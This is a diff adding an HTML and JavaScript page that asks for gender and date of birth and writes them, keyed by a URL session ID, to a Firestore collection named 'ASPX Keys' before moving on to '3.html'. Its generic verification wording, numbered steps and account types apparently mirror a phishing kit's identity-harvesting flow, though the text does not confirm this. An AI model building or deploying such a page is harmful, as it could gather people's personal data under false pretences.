@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm your info</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        /* CSS Variables for Real-Time Light/Dark Mode Switching */
+        :root {
+            --bg-color: #ffffff;
+            --text-primary: #000000;
+            --text-secondary: #555555;
+            --input-border: #c4c4c4;
+            --input-focus: #000000;
+            --input-bg: #ffffff;
+            --btn-bg: #000000;
+            --btn-text: #ffffff;
+            --btn-hover: #333333;
+            --error-text: #d93025;
+        }
+
+        /* Auto-detects device theme without reloading */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #121212;
+                --text-primary: #ffffff;
+                --text-secondary: #aaaaaa;
+                --input-border: #555555;
+                --input-focus: #ffffff;
+                --input-bg: #1e1e1e;
+                --btn-bg: #ffffff;
+                --btn-text: #000000;
+                --btn-hover: #e0e0e0;
+                --error-text: #ff6b6b;
+            }
+        }
+
+        * { 
+            box-sizing: border-box; 
+            font-family: 'Inter', sans-serif; /* Applied Inter Font */
+        }
+        
+        body { 
+            background-color: var(--bg-color); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            color: var(--text-primary);
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
+        
+        h1 { font-size: 32px; font-weight: 600; margin-bottom: 15px; color: var(--text-primary); }
+        p { color: var(--text-secondary); font-size: 15px; margin-bottom: 35px; line-height: 1.4; }
+        
+        .input-group { position: relative; margin-bottom: 22px; text-align: left; }
+        
+        .label { 
+            position: absolute; 
+            top: -10px; 
+            left: 20px; /* Adjusted for capsule curve */
+            background: var(--bg-color); /* Matches bg to seamlessly cut the border */
+            padding: 0 5px; 
+            font-size: 12px; 
+            color: var(--text-secondary); 
+            z-index: 1; 
+        }
+        
+        .dob-flex { display: flex; gap: 12px; }
+        
+        .input-field { 
+            width: 100%; 
+            padding: 14px 20px; /* Increased side padding for capsule */
+            border: 1px solid var(--input-border); 
+            border-radius: 50px; /* Capsule Look */
+            font-size: 16px; 
+            outline: none; 
+            background-color: var(--input-bg);
+            color: var(--text-primary);
+            transition: border 0.2s; 
+        }
+        
+        .input-field:focus { 
+            border-color: var(--input-focus); 
+            border-width: 1.5px; 
+        }
+
+        /* Fix default dropdown styling in capsule */
+        select.input-field {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            cursor: pointer;
+        }
+
+        .btn-continue { 
+            width: 100%; 
+            padding: 15px; 
+            background-color: var(--btn-bg); 
+            color: var(--btn-text); 
+            border: none; 
+            border-radius: 50px; /* Capsule Look */
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: 15px; 
+            transition: background-color 0.2s;
+        }
+        
+        .btn-continue:hover { background-color: var(--btn-hover); }
+        .error-text { color: var(--error-text); font-size: 13px; margin-top: 5px; display: none; text-align: left; padding-left: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1 id="main-heading">Let's confirm your age</h1>
+    <p id="sub-text">This helps us personalize your experience and provide the right settings...</p>
+
+    <div class="input-group">
+        <span class="label">Gender</span>
+        <select id="gender" class="input-field">
+            <option value="" disabled selected>Select Gender</option>
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+            <option value="Rather Not To Say">Rather Not To Say</option>
+        </select>
+    </div>
+
+    <div class="dob-flex">
+        <div class="input-group" style="flex: 1;">
+            <span class="label">Day</span>
+            <input type="number" id="day" class="input-field" placeholder="DD" oninput="if(this.value.length > 2) this.value = this.value.slice(0, 2);">
+        </div>
+        
+        <div class="input-group" style="flex: 2;">
+            <span class="label">Month</span>
+            <select id="month" class="input-field">
+                <option value="01">January</option>
+                <option value="02">February</option>
+                <option value="03">March</option>
+                <option value="04">April</option>
+                <option value="05">May</option>
+                <option value="06">June</option>
+                <option value="07">July</option>
+                <option value="08">August</option>
+                <option value="09">September</option>
+                <option value="10">October</option>
+                <option value="11">November</option>
+                <option value="12">December</option>
+            </select>
+        </div>
+
+        <div class="input-group" style="flex: 1.5;">
+            <span class="label">Year</span>
+            <input type="number" id="year" class="input-field" placeholder="YYYY" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
+        </div>
+    </div>
+
+    <div id="error" class="error-text">Please enter valid details.</div>
+    <button id="nextBtn" class="btn-continue">Continue</button>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    // Added getDoc to imports
+    import { getFirestore, doc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+        authDomain: "question-metabase.firebaseapp.com",
+        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "question-metabase",
+        storageBucket: "question-metabase.firebasestorage.app",
+        messagingSenderId: "770698198753",
+        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+        measurementId: "G-6ZP1FPMKSJ"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('session');
+
+    // Fetch user data dynamically from Firestore to update the UI
+    if (sessionId) {
+        const docRef = doc(db, "ASPX Keys", sessionId);
+        
+        getDoc(docRef).then((docSnap) => {
+            if (docSnap.exists()) {
+                const data = docSnap.data();
+                const type = data.type;
+                const firstName = data.firstName; // Extracted from DB
+
+                const heading = document.getElementById("main-heading");
+                const subText = document.getElementById("sub-text");
+
+                // Update H1 based on type
+                if (type === "personal" || type === "business" || type === "kids") {
+                    heading.innerText = "Let’s Confirm Some of Your Basic Information";
+                }
+
+                // Update Paragraph based on type & firstName
+                if (type === "kids") {
+                    subText.innerText = `Enter ${firstName}'s birthday and gender`;
+                } else if (type === "personal" || type === "business") {
+                    subText.innerText = "Enter Your birthday & Gender";
+                }
+            }
+        }).catch((error) => {
+            console.error("Error fetching document data: ", error);
+        });
+    }
+
+    // Handle Form Submission
+    document.getElementById('nextBtn').addEventListener('click', async () => {
+        const day = document.getElementById('day').value;
+        const month = document.getElementById('month').value;
+        const year = document.getElementById('year').value;
+        const gender = document.getElementById('gender').value;
+        const errorDiv = document.getElementById('error');
+
+        if (!gender || day.length < 1 || year.length !== 4) {
+            errorDiv.style.display = 'block';
+            return;
+        }
+
+        try {
+            const docRef = doc(db, "ASPX Keys", sessionId);
+
+            await updateDoc(docRef, {
+                dob: `${day}/${month}/${year}`,
+                gender: gender,
+                updatedAt: serverTimestamp()
+            });
+
+            window.location.href = `3.html?session=${sessionId}`;
+            
+        } catch (e) {
+            console.error("Update Error: ", e);
+            alert("Session expired or invalid document ID.");
+        }
+    });
+</script>
+
+</body>
+</html>
